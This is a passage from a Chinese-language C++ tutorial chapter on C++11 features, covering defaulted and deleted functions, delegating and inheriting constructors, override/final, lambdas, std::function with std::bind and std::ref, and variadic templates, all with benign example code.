string）来实现，这些组件已经正确地处理了资源的复制、移动和释放。如果遵循 Rule of Zero，编译器生成的默认版本通常就能正常工作。 18.3.2 默认的方法和禁用的方法 (= default, = delete)C++11 允许你更明确地控制特殊成员函数的生成： = default: 显式地告诉编译器生成该特殊成员函数的默认实现。即使因为你定义了其他构造函数或移动操作而导致编译器原本不会生成它，= default 也可以强制生成默认版本（如果可能的话）。这对于希望拥有默认行为但又需要自定义其他构造函数的情况很有用。 12345678910111213class MyClassDefault &#123;public: MyClassDefault(int val) : data(val) &#123;&#125; // 自定义构造函数 // 即使定义了其他构造函数，仍显式要求编译器生成默认构造函数 MyClassDefault() = default; // 显式要求编译器生成默认的复制构造函数 MyClassDefault(const MyClassDefault&amp;) = default; // ... 其他特殊成员函数也可以 = defaultprivate: int data;&#125;; = delete: 显式地禁用某个成员函数（可以是特殊成员函数，也可以是普通成员函数）。如果代码尝试调用被 = delete 的函数，编译器会报错。这常用于阻止对象的复制或防止不期望的类型转换。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;memory&gt; // for unique_ptrclass NonCopyable &#123;public: NonCopyable() = default; // 禁用复制构造函数 NonCopyable(const NonCopyable&amp;) = delete; // 禁用复制赋值运算符 NonCopyable&amp; operator=(const NonCopyable&amp;) = delete; // 移动操作通常仍可默认生成或显式 default NonCopyable(NonCopyable&amp;&amp;) = default; NonCopyable&amp; operator=(NonCopyable&amp;&amp;) = default;&#125;;class ResourceManager &#123;private: std::unique_ptr&lt;int&gt; ptr; // unique_ptr 本身是不可复制的public: ResourceManager(int val) : ptr(std::make_unique&lt;int&gt;(val)) &#123;&#125; // 由于 unique_ptr 不可复制，编译器不会生成默认的复制操作 // 我们可以显式禁用它们，使意图更明确 ResourceManager(const ResourceManager&amp;) = delete; ResourceManager&amp; operator=(const ResourceManager&amp;) = delete; // 移动操作是允许的 (unique_ptr 可移动) ResourceManager(ResourceManager&amp;&amp;) = default; ResourceManager&amp; operator=(ResourceManager&amp;&amp;) = default; // 防止通过整数进行隐式转换构造 explicit ResourceManager(long long) = delete; // 禁止 long long 构造&#125;;int main() &#123; NonCopyable nc1; // NonCopyable nc2 = nc1; // 编译错误！复制构造函数被删除 // NonCopyable nc3; // nc3 = nc1; // 编译错误！复制赋值运算符被删除 ResourceManager rm1(10); // ResourceManager rm2 = rm1; // 编译错误！ ResourceManager rm3 = std::move(rm1); // OK，移动构造函数是默认的 // ResourceManager rm4(100LL); // 编译错误！long long 构造函数被删除 return 0;&#125; = default 和 = delete 提高了代码的清晰度和对类行为的控制力。 18.3.3 委托构造函数C++11 允许一个构造函数调用同一个类的另一个构造函数，这称为**委托构造函数 (Delegating Constructor)**。这有助于减少构造函数之间的代码重复。 被委托的构造函数（目标构造函数）会先执行。 目标构造函数执行完毕后，委托构造函数函数体内的代码（如果有的话）才会执行。 委托调用必须出现在构造函数的初始化列表位置。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;string&gt;#include &lt;iostream&gt;class Report &#123;private: int id; std::string title; std::string content;public: // 目标构造函数 (执行实际初始化) Report(int i, const std::string&amp; t, const std::string&amp; c) : id(i), title(t), content(c) &#123; std::cout &lt;&lt; &quot;Target constructor called (id=&quot; &lt;&lt; id &lt;&lt; &quot;).\\n&quot;; // ... 可能还有其他初始化逻辑 ... &#125; // 委托构造函数 1: 提供默认 content Report(int i, const std::string&amp; t) : Report(i, t, &quot;Default Content&quot;) &#123; // 委托给三个参数的构造函数 std::cout &lt;&lt; &quot;Delegating constructor 1 called.\\n&quot;; // 这里可以添加此构造函数特有的逻辑 &#125; // 委托构造函数 2: 提供默认 title 和 content Report(int i) : Report(i, &quot;Default Title&quot;) &#123; // 委托给两个参数的构造函数 std::cout &lt;&lt; &quot;Delegating constructor 2 called.\\n&quot;; &#125; // 委托构造函数 3: 提供所有默认值 Report() : Report(0) &#123; // 委托给一个参数的构造函数 std::cout &lt;&lt; &quot;Delegating constructor 3 (default) called.\\n&quot;; &#125; void print() const &#123; std::cout &lt;&lt; &quot;ID: &quot; &lt;&lt; id &lt;&lt; &quot;, Title: &quot; &lt;&lt; title &lt;&lt; &quot;, Content: &quot; &lt;&lt; content &lt;&lt; std::endl; &#125;&#125;;int main() &#123; std::cout &lt;&lt; &quot;Creating r1:\\n&quot;; Report r1(101, &quot;Monthly Report&quot;, &quot;Details...&quot;); // 调用目标构造 r1.print(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating r2:\\n&quot;; Report r2(102, &quot;Weekly Update&quot;); // 调用委托构造 1 -&gt; 目标构造 r2.print(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating r3:\\n&quot;; Report r3(103); // 调用委托构造 2 -&gt; 委托构造 1 -&gt; 目标构造 r3.print(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating r4:\\n&quot;; Report r4; // 调用委托构造 3 -&gt; 委托构造 2 -&gt; 委托构造 1 -&gt; 目标构造 r4.print(); std::cout &lt;&lt; &quot;------\\n&quot;; return 0;&#125; 委托构造函数使得初始化逻辑可以集中在一个或少数几个构造函数中，其他构造函数只需提供默认值并委托即可。 18.3.4 继承构造函数在 C++11 之前，如果派生类想使用基类的构造函数，它必须在自己的构造函数初始化列表中显式调用基类构造函数，并且为每个需要的基类构造函数签名提供一个对应的派生类构造函数。 C++11 允许派生类使用 using 声明来继承基类的构造函数（但有一些例外，如涉及虚基类的构造函数通常不被继承）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;string&gt;#include &lt;iostream&gt;class Base &#123;private: int value; std::string name;public: Base(int v, std::string n) : value(v), name(n) &#123; std::cout &lt;&lt; &quot;Base(int, string) called.\\n&quot;; &#125; Base(int v) : Base(v, &quot;DefaultName&quot;) &#123; // 使用委托构造 std::cout &lt;&lt; &quot;Base(int) called.\\n&quot;; &#125; Base() : Base(0) &#123; // 使用委托构造 std::cout &lt;&lt; &quot;Base() called.\\n&quot;; &#125; void display() const &#123; std::cout &lt;&lt; &quot;Base - Value: &quot; &lt;&lt; value &lt;&lt; &quot;, Name: &quot; &lt;&lt; name &lt;&lt; std::endl; &#125;&#125;;class Derived : public Base &#123;private: double extra_data;public: // 继承 Base 的所有构造函数 using Base::Base; // 编译器会生成对应的 Derived 构造函数，它们调用匹配的 Base 构造函数 // 可以添加新的构造函数，或者覆盖继承来的构造函数 (如果签名相同) Derived(double d) : Base(999, &quot;Special&quot;), extra_data(d) &#123; std::cout &lt;&lt; &quot;Derived(double) called.\\n&quot;; &#125; // 如果需要对继承来的构造函数添加额外初始化，需要显式定义 // 例如，如果想让 Derived(int) 初始化 extra_data Derived(int v) : Base(v), extra_data(0.0) &#123; // 显式调用基类构造并初始化成员 std::cout &lt;&lt; &quot;Derived(int) explicitly defined.\\n&quot;; &#125; void display_derived() const &#123; display(); // 调用基类的 display std::cout &lt;&lt; &quot;Derived - Extra Data: &quot; &lt;&lt; extra_data &lt;&lt; std::endl; &#125;&#125;;int main() &#123; std::cout &lt;&lt; &quot;Creating d1:\\n&quot;; Derived d1(10, &quot;Object1&quot;); // 调用继承来的 Base(int, string) 对应的构造函数 d1.display_derived(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating d2:\\n&quot;; Derived d2(20); // 调用 Derived 自己定义的 Derived(int) 构造函数 d2.display_derived(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating d3:\\n&quot;; Derived d3; // 调用继承来的 Base() 对应的构造函数 d3.display_derived(); std::cout &lt;&lt; &quot;------\\n&quot;; std::cout &lt;&lt; &quot;Creating d4:\\n&quot;; Derived d4(3.14); // 调用 Derived 自己定义的 Derived(double) 构造函数 d4.display_derived(); std::cout &lt;&lt; &quot;------\\n&quot;; return 0;&#125; 继承构造函数简化了派生类的编写，特别是当基类有多个构造函数时，避免了编写大量仅仅是转发参数的派生类构造函数。 18.3.5 管理虚方法：override 和 finalC++11 提供了两个新的**上下文关键字 (Contextual Keywords)**（只在特定位置有特殊含义，其他地方可用作标识符）来帮助管理类继承体系中的虚函数：override 和 final。 override: 显式地放在派生类中重写 (override) 的虚函数声明或定义之后。 作用：让编译器检查该函数是否确实覆盖了基类中的某个虚函数（函数签名、const 限定符、引用限定符必须完全匹配）。 如果派生类函数标记为 override 但并未覆盖任何基类虚函数（例如因为拼写错误、参数类型不匹配、const 不匹配），编译器会报错。 这有助于防止因意外签名不匹配而导致的覆盖失败（变成隐藏或定义新函数）。 final (用于虚函数): 显式地放在派生类中重写的虚函数声明或定义之后。 作用：阻止任何后续的派生类进一步覆盖这个虚函数。 final (用于类): 放在类定义的 class 关键字之后，类名之前或之后。 作用：阻止该类被任何其他类继承。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;class Document &#123;public: virtual void print() const &#123; std::cout &lt;&lt; &quot;Printing a generic document.\\n&quot;; &#125; virtual void save(const char* filename) &#123; std::cout &lt;&lt; &quot;Saving generic document to &quot; &lt;&lt; filename &lt;&lt; &quot;\\n&quot;; &#125; virtual ~Document() = default; // 虚析构函数很重要&#125;;// Report 继承自 Document// Report 本身也禁止被进一步继承 (final class)class Report final : public Document &#123;public: // 使用 override 确保正确覆盖 void print() const override &#123; // OK，覆盖了基类的 print std::cout &lt;&lt; &quot;Printing a specific report.\\n&quot;; &#125; // void save(char* filename) override; // 编译错误！参数类型 const char* vs char* 不匹配 // 使用 final 阻止后续派生类覆盖 save void save(const char* filename) override final &#123; std::cout &lt;&lt; &quot;Saving report securely to &quot; &lt;&lt; filename &lt;&lt; &quot;\\n&quot;; &#125; // void nonVirtualMethod() override; // 编译错误！基类没有这个虚函数&#125;;/*// 编译错误！Report 被标记为 final，不能被继承class SpecialReport : public Report &#123;public: // 编译错误！save 在 Report 中被标记为 final // void save(const char* filename) override &#123; // std::cout &lt;&lt; &quot;Trying to save special report...\\n&quot;; // &#125;&#125;;*/int main() &#123; Document* doc1 = new Document(); Document* doc2 = new Report(); doc1-&gt;print(); // Output: Printing a generic document. doc2-&gt;print(); // Output: Printing a specific report. (多态) doc1-&gt;save(&quot;doc.txt&quot;); doc2-&gt;save(&quot;report.txt&quot;); // 调用 Report::save delete doc1; delete doc2; return 0;&#125; override 和 final 提高了代码的健壮性和可维护性，使得在复杂的继承体系中更容易正确地管理虚函数，并明确设计意图。 18.4 Lambda 函数C++11 引入了一个非常强大的特性：Lambda 表达式 (Lambda Expression)**，通常简称为 **Lambda 函数 或 Lambda。Lambda 表达式允许我们在需要可调用对象（如函数指针、函数对象）的地方就地定义一个匿名的函数对象。 Lambda 的主要目的是提供一种简洁的方式来定义简短的、通常只在局部范围内使用的函数或操作，特别是在将它们作为参数传递给 STL 算法时。 Lambda 表达式语法Lambda 表达式的基本语法如下： 123[capture_clause](parameters) -&gt; return_type &#123; // function body&#125; [capture_clause] (捕获子句): 这是 Lambda 表达式的开始。方括号 [] 用于指定如何从定义 Lambda 的外部作用域捕获变量（即让 Lambda 内部可以访问外部变量）。 []: 不捕获任何外部变量。 [=]: 以值拷贝方式捕获所有外部作用域中的自动变量（局部变量和参数）。 [&amp;]: 以引用方式捕获所有外部作用域中的自动变量。 [var]: 以值拷贝方式捕获指定的变量 var。 [&amp;var]: 以引用方式捕获指定的变量 var。 [this]: 捕获当前对象的 this 指针（仅在类的非静态成员函数内部有效）。 可以混合使用，例如 [=, &amp;var1, &amp;var2] (默认值捕获，但 var1 和 var2 引用捕获)，[&amp;, var1, var2] (默认引用捕获，但 var1 和 var2 值捕获)。 (parameters) (参数列表): 可选。与普通函数的参数列表类似，定义 Lambda 接受的参数。如果 Lambda 不需要参数，可以省略 ()。 -&gt; return_type (返回类型): 可选。用于显式指定 Lambda 的返回类型。如果省略，编译器会尝试根据函数体中的 return 语句自动推断返回类型（如果函数体只有一个 return 语句，或者所有 return 语句返回相同类型，或者没有 return 语句则推断为 void）。如果无法推断或需要特定类型，则必须显式指定。 &#123; function body &#125; (函数体): 包含 Lambda 执行的代码，与普通函数的函数体类似。 最简单的 Lambda: 1[]()&#123; std::cout &lt;&lt; &quot;Hello Lambda!\\n&quot;; &#125; // 一个不捕获、不接受参数、无返回值的 Lambda Lambda 的类型: 每个 Lambda 表达式都会生成一个唯一的、未命名的函数对象类型。这意味着即使两个 Lambda 表达式的文本完全相同，它们的类型也是不同的。 123auto lambda1 = []()&#123;&#125;;auto lambda2 = []()&#123;&#125;;// decltype(lambda1) != decltype(lambda2) 我们可以将 Lambda 赋值给 auto 变量，或者存储在 std::function 包装器中。 18.4.1 比较函数指针、函数符和 Lambda 函数在需要传递可调用实体的场景（如 STL 算法）中，我们可以使用函数指针、函数对象（函数符）或 Lambda 函数。 函数指针: 优点：语法简单，对于已存在的普通函数很方便。 缺点：不能携带状态，通常无法内联，灵活性差。 函数对象 (Functor): 优点：可以携带状态（通过成员变量），可以内联，类型安全。 缺点：需要单独定义一个类，代码相对冗长，特别是对于简单的操作。 Lambda 函数: 优点：语法简洁，可以直接在调用点定义，易于阅读；可以通过捕获子句方便地访问（携带）外部状态；通常可以内联；功能强大灵活。 缺点：对于复杂或需要在多处重用的逻辑，单独定义函数或函数对象可能更清晰。 示例对比 (用于 std::sort 的自定义比较): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;// 1. 使用函数指针bool compareDescendingPtr(int a, int b) &#123; return a &gt; b;&#125;// 2. 使用函数对象struct CompareDescendingFunctor &#123; bool operator()(int a, int b) const &#123; return a &gt; b; &#125;&#125;;int main() &#123; std::vector&lt;int&gt; v = &#123;3, 1, 4, 1, 5, 9&#125;; std::vector&lt;int&gt; v_copy1 = v; std::vector&lt;int&gt; v_copy2 = v; std::vector&lt;int&gt; v_copy3 = v; // 使用函数指针排序 std::sort(v_copy1.begin(), v_copy1.end(), compareDescendingPtr); // 使用函数对象排序 std::sort(v_copy2.begin(), v_copy2.end(), CompareDescendingFunctor()); // 使用 Lambda 函数排序 std::sort(v_copy3.begin(), v_copy3.end(), [](int a, int b) -&gt; bool &#123; return a &gt; b; &#125; // -&gt; bool 可省略 ); std::cout &lt;&lt; &quot;Sorted (ptr): &quot;; for(int x : v_copy1) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Sorted (functor): &quot;; for(int x : v_copy2) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Sorted (lambda): &quot;; for(int x : v_copy3) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; return 0;&#125; 在这个例子中，Lambda 表达式提供了最简洁的语法，将比较逻辑直接写在了 sort 调用处。 18.4.2 为何使用 lambdaLambda 表达式的主要优势在于其简洁性和局部性。 简洁性: 对于只需要一两行代码的简单操作或谓词，定义一个完整的函数或函数对象类显得过于繁琐。Lambda 允许用非常紧凑的语法直接表达这些逻辑。 局部性: Lambda 可以直接定义在使用它的地方（例如，作为算法的参数）。这使得代码更易于阅读和理解，因为操作逻辑和调用它的代码紧密地放在一起，不需要跳转到其他地方去查找函数或类的定义。 状态捕获: Lambda 的捕获机制提供了一种非常方便的方式来访问定义 Lambda 时所处作用域的局部变量，而无需手动将这些变量包装到函数对象中。 示例 (使用捕获): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;int main() &#123; std::vector&lt;int&gt; nums = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; int threshold = 5; std::vector&lt;int&gt; results; // 使用 lambda 查找所有大于 threshold 的数，并复制到 results // 捕获 threshold (值拷贝) 和 results (引用) std::for_each(nums.begin(), nums.end(), [threshold, &amp;results](int x) &#123; if (x &gt; threshold) &#123; results.push_back(x); // 可以修改引用捕获的 results // threshold = 10; // 编译错误！值捕获的变量默认是 const 的 &#125; &#125;); std::cout &lt;&lt; &quot;Numbers greater than &quot; &lt;&lt; threshold &lt;&lt; &quot;: &quot;; for (int r : results) &#123; std::cout &lt;&lt; r &lt;&lt; &quot; &quot;; // 输出: 6 7 8 9 10 &#125; std::cout &lt;&lt; std::endl; // 演示 mutable lambda (允许修改值捕获的变量的副本) int counter = 0; auto mutable_lambda = [counter]() mutable &#123; // 使用 mutable counter++; // 现在可以修改 counter 的副本了 std::cout &lt;&lt; &quot;Lambda counter (copy): &quot; &lt;&lt; counter &lt;&lt; std::endl; &#125;; mutable_lambda(); // 输出 1 mutable_lambda(); // 输出 2 std::cout &lt;&lt; &quot;Original counter: &quot; &lt;&lt; counter &lt;&lt; std::endl; // 输出 0 (原始 counter 未变) // 演示引用捕获修改外部变量 int external_sum = 0; std::for_each(nums.begin(), nums.end(), [&amp;external_sum](int x)&#123; // 引用捕获 external_sum += x; &#125;); std::cout &lt;&lt; &quot;Sum calculated via lambda: &quot; &lt;&lt; external_sum &lt;&lt; std::endl; // 输出 55 return 0;&#125; mutable 关键字: 默认情况下，通过值捕获的变量在 Lambda 函数体内部是 const 的，不能被修改。如果你需要在 Lambda 内部修改值捕获变量的副本（这种修改不会影响外部原始变量），可以在参数列表 () 之后（或捕获列表 [] 之后，如果没有参数）加上 mutable 关键字。 Lambda 表达式是现代 C++ 中编写简洁、高效且易读代码的重要工具，尤其是在与 STL 算法结合使用时。 18.5 包装器在 C++ 中，有多种“可调用 (Callable)”的实体：普通函数、函数指针、函数对象（Functors）、Lambda 表达式、类的成员函数指针等。虽然它们都可以被调用，但它们的类型各不相同。这在需要存储或传递未知类型的可调用实体时会带来不便。 例如，你可能想创建一个回调函数列表，列表中的函数可以来自不同的源（有些是普通函数，有些是 Lambda，有些是对象的成员函数），但它们都接受相同的参数并返回相同的类型。如何用一个统一的类型来存储它们呢？ C++11 在 &lt;functional&gt; 头文件中提供了 std::function 模板类，它是一个通用的、多态的函数包装器 (Function Wrapper)**。std::function 的对象可以存储、复制和调用**任何符合其指定函数签名的可调用实体。 18.5.1 包装器 functionstd::function 的模板参数是它所要包装的函数的**签名 (Signature)**。 语法: 123#include &lt;functional&gt;std::function&lt;ReturnType(ArgType1, ArgType2, ...)&gt; func_wrapper; ReturnType: 被包装函数的返回类型。 ArgType1, ArgType2, ...: 被包装函数接受的参数类型列表。 基本用法: 你可以将任何具有兼容签名的可调用实体赋值给 std::function 对象。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;functional&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;// 1. 普通函数void print_message(const std::string&amp; msg) &#123; std::cout &lt;&lt; &quot;Function Pointer: &quot; &lt;&lt; msg &lt;&lt; std::endl;&#125;// 2. 函数对象 (Functor)struct Printer &#123; std::string prefix; Printer(std::string p) : prefix(p) &#123;&#125; void operator()(const std::string&amp; msg) const &#123; std::cout &lt;&lt; &quot;Functor (&quot; &lt;&lt; prefix &lt;&lt; &quot;): &quot; &lt;&lt; msg &lt;&lt; std::endl; &#125;&#125;;// 3. 类的成员函数struct Greeter &#123; void greet(const std::string&amp; name) &#123; std::cout &lt;&lt; &quot;Member Function: Hello, &quot; &lt;&lt; name &lt;&lt; &quot;!&quot; &lt;&lt; std::endl; &#125;&#125;;int main() &#123; // 定义一个可以包装 void(const std::string&amp;) 类型函数的 std::function std::function&lt;void(const std::string&amp;)&gt; callback; // a) 包装普通函数指针 callback = print_message; callback(&quot;Hello from function pointer!&quot;); // b) 包装 Lambda 表达式 callback = [](const std::string&amp; msg) &#123; std::cout &lt;&lt; &quot;Lambda: &quot; &lt;&lt; msg &lt;&lt; std::endl; &#125;; callback(&quot;Hello from lambda!&quot;); // c) 包装函数对象 Printer my_printer(&quot;LOG&quot;); callback = my_printer; // Functor 对象可以直接赋值 callback(&quot;Hello from functor!&quot;); // d) 包装类的成员函数 (需要绑定对象) Greeter greeter_obj; // 使用 std::bind (或者 Lambda) 来绑定 this 指针 callback = std::bind(&amp;Greeter::greet, &amp;greeter_obj, std::placeholders::_1); // 或者使用 Lambda 捕获对象 // callback = [&amp;greeter_obj](const std::string&amp; name)&#123; greeter_obj.greet(name); &#125;; callback(&quot;Alice&quot;); // 调用 greeter_obj.greet(&quot;Alice&quot;) // 检查 std::function 是否为空 (是否持有可调用对象) if (callback) &#123; std::cout &lt;&lt; &quot;Callback is holding a callable entity.&quot; &lt;&lt; std::endl; &#125; // 清空 std::function callback = nullptr; if (!callback) &#123; std::cout &lt;&lt; &quot;Callback is now empty.&quot; &lt;&lt; std::endl; &#125; // 存储不同类型的回调函数 std::vector&lt;std::function&lt;void(const std::string&amp;)&gt;&gt; callbacks; callbacks.push_back(print_message); callbacks.push_back([](const std::string&amp; s)&#123; std::cout &lt;&lt; &quot;Another Lambda: &quot; &lt;&lt; s &lt;&lt; std::endl; &#125;); callbacks.push_back(my_printer); std::cout &lt;&lt; &quot;\\n--- Calling stored callbacks ---&quot; &lt;&lt; std::endl; for (const auto&amp; cb : callbacks) &#123; cb(&quot;Test message&quot;); &#125; return 0;&#125; std::function 通过类型擦除 (Type Erasure) 技术实现了这种通用性。它内部可以存储不同类型的可调用对象，并在调用时通过某种机制（通常涉及堆分配和虚函数调用，特别是对于捕获了数据的 Lambda 或大型函数对象）来执行实际的调用。 18.5.1 (续) function 及模板的低效性 (潜在开销)虽然 std::function 非常灵活，但这种灵活性是有代价的： 类型擦除开销: 为了能够存储任意类型的可调用对象，std::function 通常需要在内部处理类型信息。这可能涉及到： 堆分配: 如果被包装的可调用对象（特别是带捕获的 Lambda 或函数对象）比较大，或者不能通过“小对象优化 (Small Object Optimization, SOO)”直接存储在 std::function 对象内部，就可能需要在堆上分配内存来存储它。堆分配和释放是有开销的。 间接调用: 调用存储在 std::function 中的函数通常需要通过指针或虚函数进行间接调用，这比直接函数调用或模板实例化产生的内联调用要慢。 相比模板的低效性: 如果在编译时就知道具体的可调用类型，使用模板通常会更高效。模板允许编译器为每种具体的类型生成专门的代码，并且更容易进行内联优化，避免了 std::function 的类型擦除和间接调用开销。 1234567891011121314151617// 使用模板，更高效template &lt;typename Callable&gt;void process_with_template(Callable func, const std::string&amp; data) &#123; func(data); // 直接调用，可能内联&#125;// 使用 std::function，更灵活，但可能有开销void process_with_function(std::function&lt;void(const std::string&amp;)&gt; func, const std::string&amp; data) &#123; func(data); // 间接调用&#125;int main() &#123; auto my_lambda = [](const std::string&amp; s)&#123; /*...*/ &#125;; process_with_template(my_lambda, &quot;data&quot;); // 高效 process_with_function(my_lambda, &quot;data&quot;); // 灵活，但可能稍慢 return 0;&#125; 何时使用 std::function？ 当你需要在运行时确定要调用哪个函数，或者需要存储不同类型的可调用对象在同一个容器中时（如回调系统、事件处理）。 当你需要定义一个接受任何符合特定签名的可调用对象的接口时。 何时避免使用 std::function (如果性能是关键)？ 当你在编译时就知道具体的可调用类型时，优先使用模板或直接调用。 在性能极其敏感的代码路径中（如紧密循环内部），需要仔细评估 std::function 带来的开销。 18.5.2 修复问题 / 18.5.3 其他方式这里的“修复问题”主要是指理解 std::function 的开销并根据场景选择合适的技术。“其他方式”则包括： 使用模板: 如上所述，当类型在编译时已知时，模板是最高效的选择。 使用函数指针: 对于简单的、无状态的函数，直接使用函数指针类型 ReturnType(*)(ArgTypes...) 仍然是有效的，并且开销很小。 使用 Lambda: Lambda 本身是高效的（它们是匿名的函数对象）。只有当它们被存储在 std::function 中时，才可能引入 std::function 的开销。如果可以将 Lambda 直接传递给模板化的函数（如 STL 算法），通常不会有额外开销。 std::bind: (在 &lt;functional&gt; 中) std::bind 可以用来绑定函数的参数（包括成员函数的 this 指针）或重新排列参数顺序，生成一个新的可调用对象 (函数对象)。虽然 std::bind 也能被 std::function 存储，但现代 C++ 中，Lambda 通常提供了更简洁、更易读的方式来完成类似的任务。 123456789101112131415161718#include &lt;functional&gt;#include &lt;iostream&gt;void func(int a, int b, int c) &#123; std::cout &lt;&lt; &quot;a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl;&#125;int main() &#123; // 绑定第一个参数为 100，第二个参数由调用者提供 (_1)，第三个参数为 300 auto bound_func = std::bind(func, 100, std::placeholders::_1, 300); bound_func(200); // 调用 func(100, 200, 300) // 使用 Lambda 实现相同效果 auto lambda_func = [](int b)&#123; func(100, b, 300); &#125;; lambda_func(200); // 调用 func(100, 200, 300) return 0;&#125; std::ref 和 std::cref: (在 &lt;functional&gt; 中) 当你想通过值传递的包装器（如 std::bind, std::thread 构造函数, 甚至某些情况下的 std::function）传递参数的引用时，需要使用 std::ref (用于非 const 引用) 或 std::cref (用于 const 引用) 来包装参数。它们创建了一个轻量级的引用包装器对象。 12345678910111213141516171819202122232425262728293031323334#include &lt;functional&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;thread&gt;void modify_vector(std::vector&lt;int&gt;&amp; vec) &#123; // 接受引用 if (!vec.empty()) &#123; vec[0] = 100; &#125;&#125;int main() &#123; std::vector&lt;int&gt; my_vec = &#123;1, 2, 3&#125;; // std::bind 默认按值复制参数 // auto bound_copy = std::bind(modify_vector, my_vec); // 错误或无效，bind 复制了 vector // bound_copy(); // 修改的是副本 // 使用 std::ref 传递引用 auto bound_ref = std::bind(modify_vector, std::ref(my_vec)); bound_ref(); // 正确调用 modify_vector(my_vec) std::cout &lt;&lt; &quot;Vector after bind+ref: &quot; &lt;&lt; my_vec[0] &lt;&lt; std::endl; // 输出 100 // std::thread 构造函数也复制参数，需要 std::ref 传递引用 my_vec[0] = 1; // Reset // std::thread t1(modify_vector, my_vec); // 线程操作的是 my_vec 的副本 std::thread t2(modify_vector, std::ref(my_vec)); // 线程操作的是 my_vec 的引用 // t1.join(); t2.join(); std::cout &lt;&lt; &quot;Vector after thread+ref: &quot; &lt;&lt; my_vec[0] &lt;&lt; std::endl; // 输出 100 return 0;&#125; 总之，std::function 是一个强大的通用函数包装器，提供了极大的灵活性，但在性能敏感的场景下需要注意其潜在开销，并考虑使用模板、函数指针或直接传递 Lambda 等替代方案。 18.6 可变参数模板在 C++11 之前，模板（函数模板和类模板）通常只能接受固定数量的模板参数。如果你想编写一个可以接受任意数量参数的函数（类似于 C 语言中的 printf），通常需要依赖 C 风格的可变参数机制 (&lt;cstdarg&gt;)，这种机制不是类型安全的。 C++11 引入了可变参数模板 (Variadic Templates)**，允许模板（包括函数模板和类模板）接受任意数量、任意类型**的模板参数，并在编译时进行类型安全的处理。 18.6.1 模板和函数参数包可变参数模板的核心是**参数包 (Parameter Pack)**。参数包有两种： 模板参数包 (Template Parameter Pack): 代表零个或多个模板参数（类型参数、非类型参数或模板参数）。 语法：typename... Args 或 class... Args (对于类型参数包)，Type... args (对于非类型参数包)。 ... (省略号) 是关键部分，表示这是一个参数包。 函数参数包 (Function Parameter Pack): 代表零个或多个函数参数。 语法：Args... args，其中 Args 是一个模板参数包。 示例：定义一个接受任意数量参数的函数模板 1234567891011121314151617181920#include &lt;iostream&gt;// 定义可变参数函数模板 show_list// Args 是一个模板参数包 (代表零个或多个类型)// args 是一个函数参数包 (代表零个或多个对应类型的参数)template&lt;typename... Args&gt;void show_list(Args... args) &#123; // 如何处理 args？见下文 std::cout &lt;&lt; &quot;Number of arguments: &quot; &lt;&lt; sizeof...(Args) &lt;&lt; std::endl; // 或者 sizeof...(args) 也可以&#125;int main() &#123; show_list(); // Args 为空, args 为空. 输出: Number of arguments: 0 show_list(1); // Args = &#123;int&#125;, args = &#123;1&#125;. 输出: Number of arguments: 1 show_list(1, &quot;hello&quot;); // Args = &#123;int, const char*&#125;, args = &#123;1, &quot;hello&quot;&#125;. 输出: Number of arguments: 2 show_list(1, 3.14, &#x27;c&#x27;); // Args = &#123;int, double, char&#125;, args = &#123;1, 3.14, &#x27;c&#x27;&#125;. 输出: Number of arguments: 3 return 0;&#125; sizeof...(Args) 或 sizeof...(args) 运算符可以在编译时获取参数包中的参数数量。 18.6.2 展开参数包仅仅能接受任意数量的参数还不够，我们还需要一种方法来处理 (展开, Unpack) 参数包中的每一个参数。在 C++11 中，展开参数包通常需要使用递归 (Recursion) 或其他一些模板技巧。C++17 引入了更简洁的**折叠表达式 (Fold Expressions)**，但这里我们主要关注 C++11 的方法。 展开参数包的关键在于模式匹配和递归调用：设计一个函数模板，它处理参数包中的第一个参数，然后用剩余的参数递归调用自身。还需要一个处理参数包为空（递归终止）的基本情况。 18.6.3 在可变参数模板函数中使用递归最常见的展开方式是定义两个函数模板： 一个递归版本，接受至少一个参数，处理第一个参数，然后用剩余参数调用自身。 一个基本情况版本，接受零个参数，作为递归的终止条件。 示例：递归打印所有参数 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;// 基本情况：当参数包为空时调用此版本，终止递归void print_values() &#123; std::cout &lt;&lt; std::endl; // 递归结束时打印换行&#125;// 递归版本：处理第一个参数，然后用剩余参数递归调用// Args 是模板参数包 (代表剩余参数的类型)// args 是函数参数包 (代表剩余参数的值)template&lt;typename T, typename... Args&gt;void print_values(const T&amp; first_arg, const Args&amp;... rest_args) &#123; // 1. 处理第一个参数 std::cout &lt;&lt; first_arg; // 2. 如果还有剩余参数，打印分隔符并递归调用 if constexpr (sizeof...(Args) &gt; 0) &#123; // C++17 if constexpr, 简化条件编译 std::cout &lt;&lt; &quot;, &quot;; print_values(rest_args...); // 将剩余参数包展开并传递给下一次调用 &#125; else &#123; print_values(); // 调用基本情况版本，打印换行 &#125; // C++11 写法 